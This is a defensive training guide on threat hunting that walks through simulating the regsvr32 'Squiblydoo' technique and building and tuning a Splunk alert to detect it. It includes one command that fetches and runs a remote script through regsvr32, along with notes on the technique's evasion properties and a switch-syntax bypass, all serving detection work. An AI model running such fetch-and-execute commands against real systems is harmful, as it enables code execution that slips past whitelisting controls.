# Threat Hunting 101

What is threat hunting? Hunting is self-explanatory but what exactly do we mean
when we say are searching for threats? Are we just looking for malware?

Negative! A threat is an actor attempting to gather information about or gain
unauthorized access to our users or assets.  An actor can change the malware
they're using at any time and even succeed without using malware at all.

Think of threat hunting as proactive IR--we assume automated tools have failed and
are attempting to find any signs of an adversary at work.  This could be
malware installation, lateral movement, credential theft, data gathering and
exfiltration---anything that can support their objectives.

This training document will review the following basic steps that can be used
to find adversary activity on the network:

- [Select a Technique](#select-a-technique)
- [Understand the Technique](#understand-the-technique)
- [Simulate the Technique](#simulate-the-technique)
- [Hunt the Technique](#Hunt-the-technique)
- [Perform Tuning](#Perform-Tuning)
- [Regularly Revisit and Adjust](#regularly-revisit-and-adjust)
- [Include Context and Next Actions](#include-context-and-next-actions)
- [Add To Knowledge Base](#add-to-knowledge-base)


## Select A Technique

For threat hunting in general, we start with a threat model which includes
the things we want to protect and the adversary tradecraft that will most likely
be used to try to obtain them. We then collect data from the environment that will
identify the use of this tradecraft so that we can prevent it and counter it
when it occurs.

As we saw in [Behavioral Vs Atomic Indicators](Behavioral%20Vs%20Atomic%20Indicators.md),
searches that utilize tactics, techniques, and
procedures (TTPs) detect adversary activity even if atomic indicators change.
We have many tools that are searching for atomic indicators, we should always
be trying to work our way up the Pyramid of Pain:

![](images/Threat%20Hunting%20101/image001.png)<br><br>

Crowdsourced attack data such as [Mitre ATT&CK](https://attack.mitre.org/techniques/enterprise/)
gives insights into the TTPs that are successfully utilized by malicious actors. Once a
technique is selected, we can create a way to discover if those specific behaviors
can be observed in our own environment.

As an example, let's build a simple search that hunts for the use of the
[CAR-2019-04-003: Squiblydoo](https://car.mitre.org/analytics/CAR-2019-04-003/)
technique:

![](images/Threat%20Hunting%20101/image019.jpg)<br><br>

## Understand the Technique

We need to get familiar with the components involved and what is being accomplished
when this technique is used. [Regsvr32](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490985)
and [Script Component](https://docs.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms524594)
documentation are excellent places to start.  

These resources explain that `regsvr32.exe` is a command line tool used to register
DLL files as command components.  This technique uses `regsvr32.exe` to register
the script component run-time (`scrobj.dll`) to execute arbitrary script files.  
The `/i` switch allows running scripts located on remote servers.

There are many reports and blogs like [this one](https://medium.com/@jam3s/playing-with-the-regsvr32-applocker-bypass-bd500b35ca29)
that explain the different ways the technique can be used by an adversary.  In
this case we have a technique that allows a user with normal privileges to
download and execute a script hosted on a remote server.

In addition, it uses a signed Microsoft binary, is proxy-aware, is SSL-capable,
can be used with any file extension, and is capable of leaving very little
evidence for use by tools and responders.  

## Simulate the Technique

Now let's simulate the technique on our own workstation so we can build and tune
a search that will reliably detect it.  Here we use a function from the [SIMmodule]()
 module:

![](images/Threat%20Hunting%20101/image009.png)<br><br>

The `New-SimRegsvr32` function runs the following command using PowerShell to
execute benign SCT file `payloadV.sct` using `regsvr32.exe`:

```powershell
cmd /c regsvr32 /s /u /n /i:https://s3.amazonaws.com/exercise-pcap-download-link/payloadV.sct scrobj.dll
```
<br>

So `regsvr32.exe` was just used to run an untrusted script file hosted out on
the Internet.  How do we detect this?

## Hunt the Technique

MITRE hosts the [Cyber Analytics Repository](https://car.mitre.org/analytics/)
which contains some great base searches written in pseudo syntax that can be
used for creating more targeted searches for hunting.  

In this case, the CAR already has a base search for use with Splunk/Sysmon:  

![](images/Threat%20Hunting%20101/image008.png)<br><br>

Let's use our base search and see if it catches our use of the technique.  The
search uses the sysmon sourcetype and it returns zero results:

![](images/Threat%20Hunting%20101/image010.png)<br><br>

However if we make a small adjustment and use Security logs to look for the
same conditions, we catch the simulated activity we generated:

![](images/Threat%20Hunting%20101/image011.png)<br><br>

## Perform Tuning

Tuning is the process of making your search faster and more accurate.  This
ensures your search will successfully detect what it’s designed to detect without
creating excessive false positives.  It also helps us utilize our tools more
efficiently which improves the overall effectiveness of hunting efforts.

Correctly tuning one search could take anywhere from hours, to days, to weeks--A
good way to measure its accuracy is to search last 90 days and obtain the ratio
of interesting events versus non-events.  

Let's start by looking at all hosts except the one we used for testing over the
last 30 days.  This shows a host that would be triggering the alert every few days
or so:

![](images/Threat%20Hunting%20101/image012.png)<br><br>

First we need to confirm that this is in fact legitimate activity.  Let's run
the command on our local workstation and see what is actually occurring.

We run the command without the `/s` silent switch:

![](images/Threat%20Hunting%20101/image013.png)<br><br>

We can see that the `regsvr32` process has the `scrobj` DLL loaded:

![](images/Threat%20Hunting%20101/image014.png)<br><br>

This is not something we want to detect since no arbitrary script files are
being executed.  Therefore, we can narrow our search to only `regsvr32`
processes which use the `/i` switch to pass a script file.  

The new search works, no results for last 30 days:

![](images/Threat%20Hunting%20101/image015.png)<br><br>

But we're not done... since this will be an alert that runs frequently, we need
to make sure it runs as quickly and efficiently as possible.  We can make the
following adjustments to shorten the time taken to complete the search:

- Specify the fields that are an exact match (index, sourcetype, EventCode)
- String search for those that aren't (regsvr, scrobj, /i)

These two changes make the 30 day search complete in under 10 seconds. Now we
can extend the search to 90 days:

![](images/Threat%20Hunting%20101/image016.png)<br><br>

Let's add back in the workstation we were using for testing:

![](images/Threat%20Hunting%20101/image017.png)<br><br>

This catches the technique being used to run local files as well as remote files
and every event detected is something that we would want to investigate.

Now we can to operationalize this by converting it to an alert.

## Regularly Revisit and Adjust

You will find that simple, effective techniques like this one will often become
very popular which forces vendors to develop adequate detection mechanisms.  This
in turn drives actors as well as security researchers to identify all the different
ways the technique can still be used even when protections are in place.

This means we need to revisit techniques regularly and determine if new knowledge
exists that would allow the alerts we've designed to be bypassed.

[This presentation](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1528475666.pdf)
by Matthew Dunwoody and Daniel Bohannon is an interesting and thorough deep dive
into the technique we've chosen as well as the process of creating detections in general:

![](images/Threat%20Hunting%20101/image021.png)<br><br>

In it, they show how the technique can be successfully performed using `-i` instead
of `\i`.  This is proof that our alert can be bypassed so we must now make an
adjustment to it and retest:

![](images/Threat%20Hunting%20101/image020.png)<br><br>

We get the same results with the new syntax.  This alert can now be updated and
continue running as normally scheduled.

## Include Context and Next Actions

The impact of an incident largely depends on how quickly and accurately we move
from the IDENTIFICATION to the CONTAINMENT phase. The diagram below is a
representation of how we can shrink this window.

![](images/Using%20A%20Threat%20Based%20Approach/image004.png)<br><br>

On the left is the product of all the work that was conducted researching
a particular technique.  On the right is a representation of moving that
incident from IDENTIFICATION to CONTAINMENT.  The goal is to shrink this
window by enabling the analyst to respond with maximum
[speed](#improving-speed) and [accuracy](#improving-accuracy).

So, how can we improve SPEED and ACCURACY like this for all incidents?

### Improving Speed

We improve speed by having our research, scripts, queries, and response actions
staged and ready to provide to the analyst working an incident.  This way the
analyst doesn’t have to waste time researching the technique, building the
same scripts and queries that have already been built, or trying to determine
the best responses for the technique being used.

### Improving Accuracy

We improve accuracy by ensuring the **correctness** and **completeness** of the
information we're providing the analyst.  The queries, scripts, and response
actions must be tested and verified as the most effective methods to use in our
environment.  These are developed over days and weeks, not created as the
incident unfolds.

We also ensure **consistency** with this method by ensuring that all analysts
get the same resources, scripts, queries, and response actions. All technical
documentation and OSINT sources should be carefully selected based on their value to
an incident responder.  When everyone is on the same page using the same
resources and analysis techniques, the results stay consistent and are more
easily used and understood.

With these improvements in SPEED and ACCURACY, the analyst is able to quickly
get a clear picture of the incident and is immediately equipped with the most
effective actions to take that will reduce its overall impact.

### Sample Alert

This alert provides the responder with excellent context such as examples of both
normal and malicious activity along with search syntax used and link to results:

![](images/Threat%20Hunting%20101/image018.png)<br><br>

For the search we created, I would also add the references I used:

Mitre CAR:  https://car.mitre.org/analytics/CAR-2019-04-003/
Mitre Technique:  https://attack.mitre.org/techniques/T1117/
Blog:  https://medium.com/@jam3s/playing-with-the-regsvr32-applocker-bypass-bd500b35ca29
Blog:  https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/

As well as the module/functions I used to simulate the technique:

`New-Regsvr32()` from [SIMmodule](../scripts/Modules/SIMmodule.psm1):

## Add To Knowledge Base

A knowledge base is an organized, searchable platform containing information
on previous hunting efforts, search syntax and performance, and
references to other internal or external resources that can be used by other
members of the team.

Google’s [Hunt Once, Then Automate](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492713638.pdf)
rule is a great example of this.  Once a search for a technique has been
automated and made operational, its syntax, associated scripts, and references
should be made available for use by other team members for added improvements,
adjustments, or other maintenance.


## Summary

As defenders, our goal is to prevent the adversary from operating in our environment
and meeting their objectives.  In order to do this successfully, we must learn,
understand, and become skilled at detecting the methods they will use.

- Build searches based on known TTPs
- Research and simulate the chosen technique to better understand how it's used  
- Thoroughly test and validate your searches before deploying them as alerts
- Include context and references needed for timely reporting and response
- Add all work to the Knowledge Base to prevent duplicating work and resources
